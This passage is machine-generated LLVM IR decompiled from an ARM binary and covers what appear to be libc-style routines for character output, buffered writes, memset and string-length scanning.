dec_label_pc_f450:                                ; preds = %dec_label_pc_f440
  %v1_f450 = add i32 %v0_f434, 16
  %v2_f450 = inttoptr i32 %v1_f450 to i32*
  %v3_f450 = load i32, i32* %v2_f450, align 4
  store i32 %v3_f450, i32* %r3.global-to-local, align 4
  %v3_f454 = icmp uge i32 %v3_f440, %v3_f450
  store i1 %v3_f454, i1* %cpsr_c.global-to-local, align 1
  %v9_f454 = icmp eq i32 %v3_f440, %v3_f450
  br i1 %v9_f454, label %dec_label_pc_f45c, label %dec_label_pc_f46c

dec_label_pc_f45c:                                ; preds = %dec_label_pc_f450
  store i32 %v0_f434, i32* @r0, align 4
  %v0_f460 = call i32 @function_dc5c()
  store i32 %v0_f460, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f464 = icmp eq i32 %v0_f460, 0
  br i1 %v2_f464, label %dec_label_pc_f45c.dec_label_pc_f46c_crit_edge, label %dec_label_pc_f4d8

dec_label_pc_f45c.dec_label_pc_f46c_crit_edge:    ; preds = %dec_label_pc_f45c
  %v0_f46c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f46c

dec_label_pc_f46c:                                ; preds = %dec_label_pc_f45c.dec_label_pc_f46c_crit_edge, %dec_label_pc_f450
  %v0_f46c = phi i32 [ %v0_f46c.pre, %dec_label_pc_f45c.dec_label_pc_f46c_crit_edge ], [ %v0_f434, %dec_label_pc_f450 ]
  %v1_f46c = add i32 %v0_f46c, 16
  %v2_f46c = inttoptr i32 %v1_f46c to i32*
  %v3_f46c = load i32, i32* %v2_f46c, align 4
  store i32 %v3_f46c, i32* %r2.global-to-local, align 4
  %v0_f470 = load i32, i32* @r5, align 4
  %v1_f470 = urem i32 %v0_f470, 256
  store i32 %v1_f470, i32* %r1.global-to-local, align 4
  %v1_f474 = trunc i32 %v0_f470 to i8
  %v3_f474 = inttoptr i32 %v3_f46c to i8*
  store i8 %v1_f474, i8* %v3_f474, align 1
  %v4_f474 = load i32, i32* %r2.global-to-local, align 4
  %v5_f474 = add i32 %v4_f474, 1
  store i32 %v5_f474, i32* %r2.global-to-local, align 4
  %v0_f478 = load i32, i32* @r4, align 4
  %v1_f478 = inttoptr i32 %v0_f478 to i16*
  %v2_f478 = load i16, i16* %v1_f478, align 2
  %v3_f478 = zext i16 %v2_f478 to i32
  store i32 %v3_f478, i32* %r3.global-to-local, align 4
  %v1_f47c = and i32 %v3_f478, 256
  %v2_f47c = icmp eq i32 %v1_f47c, 0
  %v2_f480 = add i32 %v0_f478, 16
  %v3_f480 = inttoptr i32 %v2_f480 to i32*
  store i32 %v5_f474, i32* %v3_f480, align 4
  br i1 %v2_f47c, label %dec_label_pc_f4d0, label %dec_label_pc_f488

dec_label_pc_f488:                                ; preds = %dec_label_pc_f46c
  %v0_f488 = load i32, i32* %r1.global-to-local, align 4
  %v2_f488 = icmp ugt i32 %v0_f488, 9
  store i1 %v2_f488, i1* %cpsr_c.global-to-local, align 1
  %v7_f488 = icmp eq i32 %v0_f488, 10
  br i1 %v7_f488, label %dec_label_pc_f490, label %dec_label_pc_f4d0

dec_label_pc_f490:                                ; preds = %dec_label_pc_f488
  %v0_f490 = load i32, i32* @r4, align 4
  store i32 %v0_f490, i32* @r0, align 4
  %v0_f494 = call i32 @function_dc5c()
  store i32 %v0_f494, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f498 = icmp eq i32 %v0_f494, 0
  br i1 %v2_f498, label %dec_label_pc_f4d0, label %dec_label_pc_f4a0

dec_label_pc_f4a0:                                ; preds = %dec_label_pc_f490
  %v0_f4a0 = load i32, i32* @r4, align 4
  %v1_f4a0 = add i32 %v0_f4a0, 16
  %v2_f4a0 = inttoptr i32 %v1_f4a0 to i32*
  %v3_f4a0 = load i32, i32* %v2_f4a0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_f4a8 = add i32 %v3_f4a0, -1
  store i32 %v1_f4a8, i32* %r3.global-to-local, align 4
  store i32 %v1_f4a8, i32* %v2_f4a0, align 4
  br label %dec_label_pc_f4dc

dec_label_pc_f4b4:                                ; preds = %dec_label_pc_f440
  %v0_f4b8 = load i32, i32* @r5, align 4
  %v6_f4b8 = trunc i32 %v0_f4b8 to i8
  store i8 %v6_f4b8, i8* %stack_var_-17, align 1
  %v9_f4b8 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v9_f4b8, i32* %r1.global-to-local, align 4
  %v1_f4bc = inttoptr i32 %v0_f434 to i16*
  store i32 %v0_f434, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_f4c4 = call i32 @function_13840(i16* %v1_f4bc, i32 %v9_f4b8, i32 1)
  store i32 %v5_f4c4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4c8 = icmp eq i32 %v5_f4c4, 0
  br i1 %v2_f4c8, label %dec_label_pc_f4d8, label %dec_label_pc_f4d0

dec_label_pc_f4d0:                                ; preds = %dec_label_pc_f488, %dec_label_pc_f4b4, %dec_label_pc_f490, %dec_label_pc_f46c, %dec_label_pc_f434
  %v0_f4d0 = load i32, i32* @r5, align 4
  %v1_f4d0 = urem i32 %v0_f4d0, 256
  store i32 %v1_f4d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f4dc

dec_label_pc_f4d8:                                ; preds = %dec_label_pc_f45c, %dec_label_pc_f420, %dec_label_pc_f4b4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f4dc

dec_label_pc_f4dc:                                ; preds = %.thread2, %dec_label_pc_f4d0, %dec_label_pc_f4a0, %dec_label_pc_f4d8
  %v2_f4e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f4e0, i32* @r4, align 4
  store i32 %v6_f3e0, i32* @r5, align 4
  %v1_f4e4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_f4e4

; uselistorder directives
  uselistorder i32 %v0_f488, { 1, 0 }
  uselistorder i32 %v0_f470, { 1, 0 }
  uselistorder i32 %v0_f434, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %v0_f3f8, { 1, 0, 2 }
  uselistorder i16* %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 10, 2, 3, 6, 4, 5, 7, 8, 12, 9, 11, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_f4dc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_f4d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f4d0, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_f410, { 1, 0 }
}

define i32 @function_f4e8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f4e8:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f4e8 = load i32, i32* @r4, align 4
  store i32 %v3_f4e8, i32* %stack_var_-16, align 4
  %v6_f4e8 = load i32, i32* @r5, align 4
  %v9_f4e8 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_f4f4 = call i32 @function_f670()
  store i32 %v0_f4f4, i32* @r6, align 4
  %v0_f4fc = load i32, i32* @r5, align 4
  %v0_f500 = load i32, i32* @r4, align 4
  %v4_f50c = inttoptr i32 %v0_f4fc to i16*
  %v5_f50c = call i32 @function_f520(i32 %v0_f500, i32 1, i32 %v0_f4f4, i16* %v4_f50c)
  %v1_f510 = load i32, i32* @r6, align 4
  %v9_f510 = icmp eq i32 %v5_f50c, %v1_f510
  br i1 %v9_f510, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_f4e8
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_f4e8, %bb
  %v1_f51c = phi i32 [ %v5_f50c, %dec_label_pc_f4e8 ], [ -1, %bb ]
  %v2_f518 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f518, i32* @r4, align 4
  store i32 %v6_f4e8, i32* @r5, align 4
  store i32 %v9_f4e8, i32* @r6, align 4
  ret i32 %v1_f51c

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_f520(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
dec_label_pc_f520:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_f520 = load i32, i32* @r6, align 4
  %v12_f520 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_f528 = load i16, i16* %arg4, align 2
  %v1_f52c = and i16 %v3_f528, 192
  %v2_f530 = icmp eq i16 %v1_f52c, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_f530, label %dec_label_pc_f55c, label %dec_label_pc_f548

dec_label_pc_f548:                                ; preds = %dec_label_pc_f520
  %v4_f550 = call i32 @function_13a34(i16* nonnull %arg4, i32 128)
  %v2_f554 = icmp eq i32 %v4_f550, 0
  br i1 %v2_f554, label %dec_label_pc_f55cthread-pre-split, label %dec_label_pc_f5bc

dec_label_pc_f55cthread-pre-split:                ; preds = %dec_label_pc_f548
  %v0_f55c.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_f55c

dec_label_pc_f55c:                                ; preds = %dec_label_pc_f55cthread-pre-split, %dec_label_pc_f520
  %v0_f56c = phi i32 [ %v0_f55c.pr, %dec_label_pc_f55cthread-pre-split ], [ %arg2, %dec_label_pc_f520 ]
  %v2_f55c = icmp eq i32 %v0_f56c, 0
  br i1 %v2_f55c, label %dec_label_pc_f5bc, label %bb

bb:                                               ; preds = %dec_label_pc_f55c
  %v1_f560 = load i32, i32* @r6, align 4
  %v3_f560 = icmp eq i32 %v1_f560, 0
  br i1 %v3_f560, label %dec_label_pc_f5bc, label %dec_label_pc_f568

dec_label_pc_f568:                                ; preds = %bb
  store i32 -1, i32* @r0, align 4
  store i32 %v0_f56c, i32* @r1, align 4
  %v0_f570 = call i32 @function_cb30()
  %v0_f574 = load i32, i32* @r6, align 4
  %tmp9 = icmp ugt i32 %v0_f574, %v0_f570
  %v0_f59c = load i32, i32* @r5, align 4
  %v1_f59c = inttoptr i32 %v0_f59c to i16*
  br i1 %tmp9, label %dec_label_pc_f59c, label %dec_label_pc_f57c

dec_label_pc_f57c:                                ; preds = %dec_label_pc_f568
  store i32 %v0_f59c, i32* %r2.global-to-local, align 4
  %v0_f580 = load i32, i32* @r4, align 4
  %v2_f580 = mul i32 %v0_f580, %v0_f574
  %v0_f584 = load i32, i32* @r7, align 4
  %v5_f588 = call i32 @function_138f4(i32 %v0_f584, i32 %v2_f580, i16* %v1_f59c)
  store i32 %v5_f588, i32* @r0, align 4
  %v0_f58c = load i32, i32* @r4, align 4
  store i32 %v0_f58c, i32* @r1, align 4
  %v0_f590 = call i32 @function_cb30()
  store i32 %v0_f590, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f5c0

dec_label_pc_f59c:                                ; preds = %dec_label_pc_f568
  %v2_f59c = load i16, i16* %v1_f59c, align 2
  %v1_f5a0 = or i16 %v2_f59c, 8
  store i16 %v1_f5a0, i16* %v1_f59c, align 2
  %v0_f5a8 = call i32 @function_d0ec()
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_f5b4 = inttoptr i32 %v0_f5a8 to i32*
  store i32 22, i32* %v2_f5b4, align 4
  %v0_f5c0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f5c0

dec_label_pc_f5bc:                                ; preds = %dec_label_pc_f55c, %dec_label_pc_f548, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f5c0

dec_label_pc_f5c0:                                ; preds = %dec_label_pc_f59c, %dec_label_pc_f57c, %dec_label_pc_f5bc
  %v0_f5c0 = phi i32 [ %v0_f5c0.pre, %dec_label_pc_f59c ], [ %v0_f590, %dec_label_pc_f57c ], [ 0, %dec_label_pc_f5bc ]
  store i32 %v9_f520, i32* @r6, align 4
  store i32 %v12_f520, i32* @r7, align 4
  ret i32 %v0_f5c0

; uselistorder directives
  uselistorder i16* %v1_f59c, { 0, 2, 1 }
  uselistorder i32 %v0_f574, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @function_138f4, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i16*, i32)* @function_13a34, { 1, 0 }
  uselistorder label %dec_label_pc_f5c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f5bc, { 2, 0, 1 }
}

define i32 @function_f5d0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f5d0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_f5d4 = load i32, i32* @r2, align 4
  %v8_f5d4 = icmp eq i32 %v0_f5d4, 8
  store i1 %v8_f5d4, i1* %cpsr_z.global-to-local, align 1
  %v5_f5d8 = icmp slt i32 %v0_f5d4, 8
  br i1 %v5_f5d8, label %dec_label_pc_f638, label %dec_label_pc_f5dc

dec_label_pc_f5dc:                                ; preds = %dec_label_pc_f5d0
  %v4_f5dc = mul i32 %arg2, 256
  %v5_f5dc = or i32 %v4_f5dc, %arg2
  %v4_f5e0 = mul i32 %v5_f5dc, 65536
  %v5_f5e0 = or i32 %v4_f5e0, %v5_f5dc
  store i32 %v5_f5e0, i32* %r1.global-to-local, align 4
  %v1_f5e457 = urem i32 %tmp, 4
  %v2_f5e458 = icmp eq i32 %v1_f5e457, 0
  store i1 %v2_f5e458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_f5e458, label %dec_label_pc_f5f4, label %bb

bb:                                               ; preds = %dec_label_pc_f5dc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_f5dc ]
  %v3_f5e859 = phi i32 [ %v6_f5e8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_f5dc ]
  %v4_f5e8 = inttoptr i32 %v3_f5e859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_f5e8, align 1
  %v5_f5e8 = load i32, i32* @r3, align 4
  %v6_f5e8 = add i32 %v5_f5e8, 1
  store i32 %v6_f5e8, i32* @r3, align 4
  %v0_f5ec.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_f5f8.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_f5ec.pr, label %dec_label_pc_f5f4, label %.thread

.thread:                                          ; preds = %bb
  %v2_f5ec = add i32 %v0_f5f8.pr.pre, -1
  store i32 %v2_f5ec, i32* @r2, align 4
  %v1_f5e4 = urem i32 %v6_f5e8, 4
  %v2_f5e4 = icmp eq i32 %v1_f5e4, 0
  store i1 %v2_f5e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f5e4, label %dec_label_pc_f5f4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_f5e8.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_f5e8.pre to i8
  br label %bb

dec_label_pc_f5f4:                                ; preds = %.thread, %bb, %dec_label_pc_f5dc
  %v0_f60028 = phi i32 [ %tmp, %dec_label_pc_f5dc ], [ %v6_f5e8, %bb ], [ %v6_f5e8, %.thread ]
  %v0_f5f8.pr = phi i32 [ %v0_f5d4, %dec_label_pc_f5dc ], [ %v0_f5f8.pr.pre, %bb ], [ %v2_f5ec, %.thread ]
  %v0_f5f4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_f5f4, i32* @ip, align 4
  %v8_f5f810 = icmp eq i32 %v0_f5f8.pr, 8
  store i1 %v8_f5f810, i1* %cpsr_z.global-to-local, align 1
  %v5_f5fc11 = icmp slt i32 %v0_f5f8.pr, 8
  br i1 %v5_f5fc11, label %dec_label_pc_f638, label %dec_label_pc_f600.preheader

dec_label_pc_f600.preheader:                      ; preds = %dec_label_pc_f5f4
  %v1_f60046 = inttoptr i32 %v0_f60028 to i32*
  store i32 %v0_f5f4, i32* %v1_f60046, align 4
  %v3_f60047 = add i32 %v0_f60028, 4
  %v4_f60048 = inttoptr i32 %v3_f60047 to i32*
  %v5_f60049 = load i32, i32* @ip, align 4
  store i32 %v5_f60049, i32* %v4_f60048, align 4
  %v6_f60050 = add i32 %v0_f60028, 8
  store i32 %v6_f60050, i32* @r3, align 4
  %v0_f60451 = load i32, i32* @r2, align 4
  %v1_f60452 = add i32 %v0_f60451, -8
  store i32 %v1_f60452, i32* %r2.global-to-local, align 4
  %v5_f60c53 = icmp slt i32 %v1_f60452, 8
  br i1 %v5_f60c53, label %dec_label_pc_f600.dec_label_pc_f638.loopexit_crit_edge, label %dec_label_pc_f610

dec_label_pc_f610:                                ; preds = %dec_label_pc_f600.preheader, %dec_label_pc_f5f8.dec_label_pc_f600_crit_edge
  %v6_f60055 = phi i32 [ %v6_f600, %dec_label_pc_f5f8.dec_label_pc_f600_crit_edge ], [ %v6_f60050, %dec_label_pc_f600.preheader ]
  %v0_f60054 = phi i32 [ %v12_f62c, %dec_label_pc_f5f8.dec_label_pc_f600_crit_edge ], [ %v0_f60028, %dec_label_pc_f600.preheader ]
  %v1_f610 = inttoptr i32 %v6_f60055 to i32*
  %v2_f610 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_f610, i32* %v1_f610, align 4
  %v3_f610 = add i32 %v0_f60054, 12
  %v4_f610 = inttoptr i32 %v3_f610 to i32*
  %v5_f610 = load i32, i32* @ip, align 4
  store i32 %v5_f610, i32* %v4_f610, align 4
  %v6_f610 = add i32 %v0_f60054, 16
  store i32 %v6_f610, i32* @r3, align 4
  %v0_f614 = load i32, i32* %r2.global-to-local, align 4
  %v1_f614 = add i32 %v0_f614, -8
  store i32 %v1_f614, i32* %r2.global-to-local, align 4
  %v5_f61c = icmp slt i32 %v1_f614, 8
  br i1 %v5_f61c, label %dec_label_pc_f610.dec_label_pc_f638.loopexit_crit_edge, label %dec_label_pc_f620

dec_label_pc_f620:                                ; preds = %dec_label_pc_f610
  %v1_f620 = inttoptr i32 %v6_f610 to i32*
  %v2_f620 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_f620, i32* %v1_f620, align 4
  %v3_f620 = add i32 %v0_f60054, 20
  %v4_f620 = inttoptr i32 %v3_f620 to i32*
  %v5_f620 = load i32, i32* @ip, align 4
  store i32 %v5_f620, i32* %v4_f620, align 4
  %v6_f620 = add i32 %v0_f60054, 24
  store i32 %v6_f620, i32* @r3, align 4
  %v0_f624 = load i32, i32* %r2.global-to-local, align 4
  %v1_f624 = add i32 %v0_f624, -8
  store i32 %v1_f624, i32* %r2.global-to-local, align 4
  %v5_f62c = icmp slt i32 %v1_f624, 8
  br i1 %v5_f62c, label %dec_label_pc_f620.dec_label_pc_f638.loopexit_crit_edge, label %dec_label_pc_f5f8

dec_label_pc_f5f8:                                ; preds = %dec_label_pc_f620
  %v7_f62c = inttoptr i32 %v6_f620 to i32*
  %v8_f62c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_f62c, i32* %v7_f62c, align 4
  %v9_f62c = add i32 %v0_f60054, 28
  %v10_f62c = inttoptr i32 %v9_f62c to i32*
  %v11_f62c = load i32, i32* @ip, align 4
  store i32 %v11_f62c, i32* %v10_f62c, align 4
  %v12_f62c = add i32 %v0_f60054, 32
  store i32 %v12_f62c, i32* @r3, align 4
  %v6_f630 = load i32, i32* %r2.global-to-local, align 4
  %v7_f630 = add i32 %v6_f630, -8
  store i32 %v7_f630, i32* %r2.global-to-local, align 4
  %v5_f5fc = icmp slt i32 %v7_f630, 8
  br i1 %v5_f5fc, label %dec_label_pc_f5f8.dec_label_pc_f638.loopexit_crit_edge, label %dec_label_pc_f5f8.dec_label_pc_f600_crit_edge

dec_label_pc_f5f8.dec_label_pc_f600_crit_edge:    ; preds = %dec_label_pc_f5f8
  %v2_f600.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_f600 = inttoptr i32 %v12_f62c to i32*
  store i32 %v2_f600.pre, i32* %v1_f600, align 4
  %v3_f600 = add i32 %v0_f60054, 36
  %v4_f600 = inttoptr i32 %v3_f600 to i32*
  %v5_f600 = load i32, i32* @ip, align 4
  store i32 %v5_f600, i32* %v4_f600, align 4
  %v6_f600 = add i32 %v0_f60054, 40
  store i32 %v6_f600, i32* @r3, align 4
  %v0_f604 = load i32, i32* %r2.global-to-local, align 4
  %v1_f604 = add i32 %v0_f604, -8
  store i32 %v1_f604, i32* %r2.global-to-local, align 4
  %v5_f60c = icmp slt i32 %v1_f604, 8
  br i1 %v5_f60c, label %dec_label_pc_f600.dec_label_pc_f638.loopexit_crit_edge, label %dec_label_pc_f610

dec_label_pc_f5f8.dec_label_pc_f638.loopexit_crit_edge: ; preds = %dec_label_pc_f5f8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f638

dec_label_pc_f600.dec_label_pc_f638.loopexit_crit_edge: ; preds = %dec_label_pc_f5f8.dec_label_pc_f600_crit_edge, %dec_label_pc_f600.preheader
  %v1_f604.lcssa = phi i32 [ %v1_f60452, %dec_label_pc_f600.preheader ], [ %v1_f604, %dec_label_pc_f5f8.dec_label_pc_f600_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f638

dec_label_pc_f610.dec_label_pc_f638.loopexit_crit_edge: ; preds = %dec_label_pc_f610
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f638

dec_label_pc_f620.dec_label_pc_f638.loopexit_crit_edge: ; preds = %dec_label_pc_f620
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f638

dec_label_pc_f638:                                ; preds = %dec_label_pc_f5f4, %dec_label_pc_f5f8.dec_label_pc_f638.loopexit_crit_edge, %dec_label_pc_f600.dec_label_pc_f638.loopexit_crit_edge, %dec_label_pc_f610.dec_label_pc_f638.loopexit_crit_edge, %dec_label_pc_f620.dec_label_pc_f638.loopexit_crit_edge, %dec_label_pc_f5d0
  %v0_f640 = phi i32 [ %v0_f5d4, %dec_label_pc_f5d0 ], [ %v1_f624, %dec_label_pc_f620.dec_label_pc_f638.loopexit_crit_edge ], [ %v1_f614, %dec_label_pc_f610.dec_label_pc_f638.loopexit_crit_edge ], [ %v1_f604.lcssa, %dec_label_pc_f600.dec_label_pc_f638.loopexit_crit_edge ], [ %v7_f630, %dec_label_pc_f5f8.dec_label_pc_f638.loopexit_crit_edge ], [ %v0_f5f8.pr, %dec_label_pc_f5f4 ]
  %v2_f638 = icmp eq i32 %v0_f640, 0
  store i1 %v2_f638, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f638, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_f638
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_f638
  %v1_f640 = sub i32 7, %v0_f640
  store i32 %v1_f640, i32* %r2.global-to-local, align 4
  %v3_f644 = mul i32 %v1_f640, 4
  %v4_f644 = add i32 %v3_f644, ptrtoint (i32* @global_var_f64c.394 to i32)
  call void @__pseudo_branch(i32 %v4_f644)
  %v0_f64c = load i32, i32* %r1.global-to-local, align 4
  %v1_f64c = trunc i32 %v0_f64c to i8
  %v2_f64c = load i32, i32* @r3, align 4
  %v3_f64c = inttoptr i32 %v2_f64c to i8*
  store i8 %v1_f64c, i8* %v3_f64c, align 1
  %v4_f64c = load i32, i32* @r3, align 4
  %v5_f64c = add i32 %v4_f64c, 1
  store i32 %v5_f64c, i32* %r3.global-to-local, align 4
  %v0_f650 = load i32, i32* %r1.global-to-local, align 4
  %v1_f650 = trunc i32 %v0_f650 to i8
  %v3_f650 = inttoptr i32 %v5_f64c to i8*
  store i8 %v1_f650, i8* %v3_f650, align 1
  %v4_f650 = load i32, i32* %r3.global-to-local, align 4
  %v5_f650 = add i32 %v4_f650, 1
  store i32 %v5_f650, i32* %r3.global-to-local, align 4
  %v0_f654 = load i32, i32* %r1.global-to-local, align 4
  %v1_f654 = trunc i32 %v0_f654 to i8
  %v3_f654 = inttoptr i32 %v5_f650 to i8*
  store i8 %v1_f654, i8* %v3_f654, align 1
  %v4_f654 = load i32, i32* %r3.global-to-local, align 4
  %v5_f654 = add i32 %v4_f654, 1
  store i32 %v5_f654, i32* %r3.global-to-local, align 4
  %v0_f658 = load i32, i32* %r1.global-to-local, align 4
  %v1_f658 = trunc i32 %v0_f658 to i8
  %v3_f658 = inttoptr i32 %v5_f654 to i8*
  store i8 %v1_f658, i8* %v3_f658, align 1
  %v4_f658 = load i32, i32* %r3.global-to-local, align 4
  %v5_f658 = add i32 %v4_f658, 1
  store i32 %v5_f658, i32* %r3.global-to-local, align 4
  %v0_f65c = load i32, i32* %r1.global-to-local, align 4
  %v1_f65c = trunc i32 %v0_f65c to i8
  %v3_f65c = inttoptr i32 %v5_f658 to i8*
  store i8 %v1_f65c, i8* %v3_f65c, align 1
  %v4_f65c = load i32, i32* %r3.global-to-local, align 4
  %v5_f65c = add i32 %v4_f65c, 1
  store i32 %v5_f65c, i32* %r3.global-to-local, align 4
  %v0_f660 = load i32, i32* %r1.global-to-local, align 4
  %v1_f660 = trunc i32 %v0_f660 to i8
  %v3_f660 = inttoptr i32 %v5_f65c to i8*
  store i8 %v1_f660, i8* %v3_f660, align 1
  %v4_f660 = load i32, i32* %r3.global-to-local, align 4
  %v5_f660 = add i32 %v4_f660, 1
  store i32 %v5_f660, i32* %r3.global-to-local, align 4
  %v0_f664 = load i32, i32* %r1.global-to-local, align 4
  %v1_f664 = trunc i32 %v0_f664 to i8
  %v3_f664 = inttoptr i32 %v5_f660 to i8*
  store i8 %v1_f664, i8* %v3_f664, align 1
  %v4_f664 = load i32, i32* %r3.global-to-local, align 4
  %v5_f664 = add i32 %v4_f664, 1
  store i32 %v5_f664, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_f600, { 1, 0 }
  uselistorder i32 %v12_f62c, { 1, 2, 0 }
  uselistorder i32 %v0_f60054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_f5f8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_f5e8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_f5dc, { 1, 0 }
  uselistorder i32 %v0_f5d4, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 10, 11, 12, 13, 9, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 2, 5, 1, 8, 7, 0, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f638, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_f610, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_f670() local_unnamed_addr {
dec_label_pc_f670:
  %v0_f670 = load i32, i32* @r0, align 4
  %v1_f670 = and i32 %v0_f670, -4
  %v1_f674 = inttoptr i32 %v1_f670 to i32*
  %v2_f674 = load i32, i32* %v1_f674, align 4
  %v1_f678 = urem i32 %v0_f670, 4
  store i32 %v1_f678, i32* @r3, align 4
  %v2_f678 = icmp eq i32 %v1_f678, 0
  %v1_f67c = sub nsw i32 0, %v1_f678
  br i1 %v2_f678, label %.preheader.preheader, label %dec_label_pc_f684

dec_label_pc_f684:                                ; preds = %dec_label_pc_f670
  %v1_f684 = or i32 %v2_f674, 255
  %v7_f688 = icmp eq i32 %v1_f678, 1
  br i1 %v7_f688, label %bb33, label %bb

bb:                                               ; preds = %dec_label_pc_f684
  %v9_f68c = or i32 %v2_f674, 65535
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_f684, %bb
  %v8_f694 = phi i32 [ %v1_f684, %dec_label_pc_f684 ], [ %v9_f68c, %bb ]
  %v1_f690 = add nsw i32 %v1_f678, -2
  store i32 %v1_f690, i32* @r3, align 4
  %v7_f694 = icmp eq i32 %v1_f678, 3
  br i1 %v7_f694, label %bb34, label %.preheader.preheader

bb34:                                             ; preds = %bb33
  %v9_f694 = or i32 %v8_f694, 16711680
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %bb33, %bb34, %dec_label_pc_f670
  %v1_f6a4.ph = phi i32 [ %v2_f674, %dec_label_pc_f670 ], [ %v9_f694, %bb34 ], [ %v8_f694, %bb33 ]
  %v1_f69838 = urem i32 %v1_f6a4.ph, 256
  %v2_f69839 = icmp eq i32 %v1_f69838, 0
  %v2_f69c40 = and i32 %v1_f6a4.ph, 65280
  %v3_f69c41 = icmp eq i32 %v2_f69c40, 0
  %or.cond42 = or i1 %v2_f69839, %v3_f69c41
  %v2_f6a043 = and i32 %v1_f6a4.ph, 16711680
  %v3_f6a044 = icmp eq i32 %v2_f6a043, 0
  %or.cond3145 = or i1 %v3_f6a044, %or.cond42
  %v4_f6a446 = icmp ult i32 %v1_f6a4.ph, 16777216
